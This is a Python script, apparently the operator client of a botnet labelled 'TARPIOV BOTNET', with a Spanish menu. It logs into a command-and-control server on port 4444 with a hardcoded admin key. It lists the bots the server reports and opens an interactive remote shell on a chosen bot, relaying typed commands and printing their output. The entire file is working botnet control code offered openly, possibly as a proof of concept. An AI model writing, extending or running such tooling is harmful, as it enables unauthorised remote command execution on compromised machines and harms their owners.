import socket
from colorama import Fore
import os

green = Fore.LIGHTGREEN_EX
cyan = Fore.LIGHTCYAN_EX
red = Fore.LIGHTRED_EX
reset = Fore.RESET
white = Fore.LIGHTWHITE_EX
magenta = Fore.LIGHTMAGENTA_EX

host = 'localhost'
port = 4444
admin_key = "poc"

banner = f"""

    {white}⠀⠀⠀⠀⠀⠀⢰⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢸⣿⡟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⡇⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠰⠆⠀⠀⠀⠀⠰⠆⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠶⠶⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⢰⣶⠄
    ⠀⠀⠀⠀⠀⠀⢸⣿⣧⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣼⣿⡇⠀⠀⢀⣿⡿⠀
    ⠀⠀⢀⣠⣴⣶⣾⣿⡿⠿⠿⠿⠿⠿⠿⣿⣿⡿⠿⣿⣿⣷⣶⣾⡿⠟⠀⠀
    ⠀⣠⣿⡿⠋⠉⢹⣿⣿⣶⠶⣶⣶⣶⣶⣿⣿⣿⣾⣿⣿⡏⠉⠁⠀⠀⠀⠀
    ⢠⣿⡟⠀⠀⠀⢸⣿⡟⠉⠀⠉⣻⣿⣿⣏⣀⣻⣿⣉⣿⡇⠀⠀⠀⠀⠀⠀
    ⠀⠉⠁⠀⠀⠀⢸⣿⣿⣿⣤⣿⣿⣿⣿⣿⡟⠋⠙⢿⣿⡇⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢸⣿⣏⣉⣉⣿⣏⣉⣹⣿⣧⣀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⣿⡿⠿⠿⠿⠿⢿⣿⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

    {cyan}╔════════════════════════════════════════════════════════════════╗
    ║ {white}                   TARPIOV BOTNET MENU                         {cyan}║
    ╟────────────────────────────────────────────────────────────────╢
    ║                                                                ║
    ║ {magenta} - clear   {white}: limpia la pantalla                                {cyan}║
    ║ {magenta} - show    {white}: lista los bots disponibles                        {cyan}║
    ║ {magenta} - connect {white}: conectate a un bot de la botnet                   {cyan}║
    ║ {magenta} - help    {white}: muestra el banner {cyan}                                ║ 
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝{white}


"""
# Comprobar sistema operativo del servidor
system = None
clear_command = None

if os.name == "posix":
    system = "linux"
    clear_command = "clear"
else:
    system = "windows"
    clear_command = "cls"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))
server.sendall(admin_key.encode())
print(banner)

while True:
    try:
        cmd = input("   > ")
        if not cmd:
            continue

        server.sendall(cmd.encode())
        response = server.recv(4096).decode()
        print(response)

        if cmd == "connect":
            port = input("Puerto > ")
            server.sendall(port.encode())
            response = server.recv(1024).decode()
            
            if "Sesion conectada" in response:
                os.system(clear_command)
                print(banner)
                print(green + response + reset)
                while True:
                    shell_cmd = input(f"bot@{port}> ").strip()
                    server.sendall(shell_cmd.encode())
                    if shell_cmd == "exit":
                        break
                    response = server.recv(4096).decode()
                    print(response)

        elif cmd == "bye":
            break

        elif cmd == "clear":
            os.system(clear_command)
            print(banner)

        elif cmd == "help":
            os.system(clear_command)
            print(banner)

    except Exception as e:
        print(f"{red} [!] Error en la conexion: {e} {reset}")
        break
